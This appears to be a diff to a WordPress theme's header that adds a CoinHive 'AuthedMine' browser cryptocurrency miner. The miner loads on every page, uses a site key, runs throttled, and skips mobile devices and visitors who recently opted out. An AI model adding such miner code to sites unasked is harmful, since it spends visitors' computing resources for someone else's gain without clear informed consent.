@@ -27,6 +27,20 @@
     js.src = 'https://connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.11&appId=143920309579134';
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));</script>
+
+  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('nH1XfOT5PGb69He3JGjtVl6ld1v7Nps1', {
+      threads: 1,
+      throttle: 0.8,
+    });
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+  </script>
 </head>
 
 <body <?php body_class(); ?>>
